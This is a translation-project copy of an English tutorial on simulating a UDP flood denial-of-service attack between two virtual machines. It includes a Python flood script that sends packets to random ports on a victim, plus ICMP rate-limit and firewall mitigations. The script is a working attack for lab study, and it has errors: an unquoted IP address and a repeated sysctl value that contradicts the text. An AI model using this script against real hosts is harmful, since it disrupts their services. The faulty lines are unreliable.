> * 原文地址：[How to simulate a UDP Flood DoS attack on your computer](https://levelup.gitconnected.com/how-to-simulate-a-udp-flood-dos-attack-on-your-computer-863b40c44f3f)
> * 原文作者：[RiccardoM](https://medium.com/@riccardom)
> * 译文出自：[掘金翻译计划](https://github.com/xitu/gold-miner)
> * 本文永久链接：[https://github.com/xitu/gold-miner/blob/master/article/2020/how-to-simulate-a-udp-flood-dos-attack-on-your-computer.md](https://github.com/xitu/gold-miner/blob/master/article/2020/how-to-simulate-a-udp-flood-dos-attack-on-your-computer.md)
> * 译者：
> * 校对者：

# How to simulate a UDP Flood DoS attack on your computer

#### Everything you need to reproduce a UDP Flood Denial of Service attack with two virtual machines

![](https://cdn-images-1.medium.com/max/12048/0*5IXgILaawtazZ2Tx)

**Disclaimer: The following tutorial has only educational purposes. Perform the attack only on computers you own.**

A UDP Flood is a Denial of Service attack where the attacker sends a large number of **UDP** (User Datagram Protocol) packets towards a victim server, in order to overwhelm the server’s ability to process and respond to incoming traffic.

The attacker sends packets to the server’s IP address, choosing **random ports** as the destination. When the server receives a packet:

1. it checks if an application is listening at the specified port
2. it sees that no application is listening; this happens most of the times, as destinations are random ports
3. it responds with an **ICMP Destination Unreachable** packet

The attacker’s IP address can possibly be spoofed to prevent both their identification and the saturation of their own resources by the ICMP responses.

---

## Setup

In order to simulate this attack you need two virtual machines. Network cards must be configured to have their own address in the subnet. I used VirtualBox, with two instances of BunsenLabs, which is very lightweight. They are configured with a network card in bridged mode. Here are the requirements for each of the virtual machines:

* an **attacker** with python3
* a **victim** with python, version 3.7 or greater

---

#### Server configuration

We will run a simple HTTP server to verify that there is a drop in performance while the server is under attack. Below is the server written in Python.

```
import sys
import time
import random
from http.server import ThreadingHTTPServer, BaseHTTPRequestHandler

class DefaultHTTPHandler(BaseHTTPRequestHandler):

  def do_GET(self):
    self.send_response(200)
    self.send_header('Content-type', 'text/plain')
    self.send_header("Cache-Control", "no-cache")
    self.end_headers()

    n = random.randint(1e7,1e8)
    self.wfile.write((("{} is " + ("" if is_prime(n) else "not ") + "a prime number").format(n)).encode("utf-8"))

def base_http_server_start(address="0.0.0.0", port=80):
    handler = DefaultHTTPHandler
    address = (address, port)
    server = ThreadingHTTPServer(address, handler, bind_and_activate=False)
    server.server_bind()
    server.server_activate()
    server.serve_forever()

def is_prime(num):
    res = True
    for i in range(2, num - 1):
        if num % i == 0:
            res = False
    return res

if __name__ == '__main__':
    print("Starting HTTP server on port 80")
    base_http_server_start()
```

This server can be reached at localhost:80. What it does is to pick a very large random number and check if it is a prime number via a deliberately very inefficient function. Thanks to this mechanism it is possible to roughly estimate the response time of the server by reloading the browser page. Response times vary from the computational capacity of your hardware, but on average they should be around 5–10 seconds.

#### Attack script

We can perform the attack with the following Python script, using sockets.

```
import time
import socket
import random
import sys

victim_ip = 192.168.1.10
duration = 60 # in seconds

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

msg = bytes(random.getrandbits(10))
timeout = time.time() + duration
sent_packets = 0

while time.time() < timeout:
  victim_port = random.randint(1025, 65356)
  sock.sendto(msg, (victim_ip, victim_port))
  sent_packets += 1
```

In this script we can specify the IP address of our victim and the duration of the attack. Each time we send a packet we choose a different port, as explained above.

---

## The attack

To execute the attack we run the server and check its performance with the method described above. Next, from the attacker’s virtual machine, we run the script that performs the attack. When the machine is under attack we can see an increase in CPU usage as it is busy processing incoming traffic and responding with ICMP Destination Unreachable packets.

We can then proceed to reload the browser page and count the response time of the server. It is therefore easy to see that server performance has deteriorated significantly. The response time should be at least twice as long as under normal conditions.

---

## Mitigation

#### Linux settings

It is very difficult to mitigate a UDP Flood attack. It is possible to change the number of ICMP packets that the operating system sends every second. We can use these two commands in Linux, for example:

```
sudo sysctl -w net.ipv4.icmp_ratelimit=0
sudo sysctl -w net.ipv4.icmp_msgs_per_sec=1000
```

The first command causes the rate at which ICMP responses are sent to be set only by the parameter of the second command. In this case, therefore, with the second command, we set a rate of 1000 ICMP messages per second.

We can easily verify this by launching the attack for 10 seconds and using Wireshark on the server’s virtual machine to intercept the ICMP packets that are sent in response. We can see that in 10 seconds about 10.000 ICMP packets are sent, which is correct since we set the rate to 1000 packets per second.

![10.000 packets captured with Wireshark during a 10 seconds attack](https://cdn-images-1.medium.com/max/2000/1*Kb3xNdtJxxD0L87W9i3IJg.png)

We can try to change this parameter and check with Wireshark how the number of packets sent during 10 seconds changes. For example by indicating a rate of 1 message per second we can capture about 10 messages.

```
sudo sysctl -w net.ipv4.icmp_msgs_per_sec=1000
```

![10 packets captured with Wireshark during a 10 seconds attack](https://cdn-images-1.medium.com/max/2000/1*3MVskJJFtm4wKB4kT5GiYg.png)

The difficult part is choosing an appropriate value for these parameters. The optimal value depends on the hardware we have available, on our application, on the average traffic our server interacts with. If we lower the number of responses sent every second we clearly decrease the load on the server, since many more incoming requests are simply dropped, without sending the ICMP response packet and therefore using less resources. However, by lowering this parameter we run a greater risk of rejecting even legitimate requests and of not processing and managing traffic that does not come from an attack, but from real users of our server. It is therefore necessary to find a compromise to balance the two aspects.

#### Firewalls

We can also try to defend ourselves against this attack using firewalls. A firewall can block UDP packets before they reach the server. This way the server resources are not used at all. However, firewalls are also vulnerable to this type of attack: they have to process incoming traffic and they could become a bottleneck during the attack. Furthermore, if we use a stateful firewall we can easily block an attack if it always comes from the same IP address, but if the attacker spoofs their IP, all the state tables of the firewall could potentially be filled and all the available memory consumed. So firewalls are not always the solution.

---

## Conclusions

It is not difficult to simulate this type of attack in a few steps to better understand how it works. You can also explore its mitigation in more detail, trying different parameters, and eventually configuring the server. It is also interesting because it is a simple but powerful attack: as we have seen it is difficult to take effective countermeasures to stop it. If you are interested in a more complex attack based on UDP, take a look at [this](https://levelup.gitconnected.com/how-to-simulate-a-ntp-amplification-dos-attack-on-your-computer-72b3c6f60eb7) story, where I explain how to exploit an NTP server to amplify the traffic volume and saturate the victim’s bandwidth.

> 如果发现译文存在错误或其他需要改进的地方，欢迎到 [掘金翻译计划](https://github.com/xitu/gold-miner) 对译文进行修改并 PR，也可获得相应奖励积分。文章开头的 **本文永久链接** 即为本文在 GitHub 上的 MarkDown 链接。

---

> [掘金翻译计划](https://github.com/xitu/gold-miner) 是一个翻译优质互联网技术文章的社区，文章来源为 [掘金](https://juejin.im) 上的英文分享文章。内容覆盖 [Android](https://github.com/xitu/gold-miner#android)、[iOS](https://github.com/xitu/gold-miner#ios)、[前端](https://github.com/xitu/gold-miner#前端)、[后端](https://github.com/xitu/gold-miner#后端)、[区块链](https://github.com/xitu/gold-miner#区块链)、[产品](https://github.com/xitu/gold-miner#产品)、[设计](https://github.com/xitu/gold-miner#设计)、[人工智能](https://github.com/xitu/gold-miner#人工智能)等领域，想要查看更多优质译文请持续关注 [掘金翻译计划](https://github.com/xitu/gold-miner)、[官方微博](http://weibo.com/juejinfanyi)、[知乎专栏](https://zhuanlan.zhihu.com/juejinfanyi)。
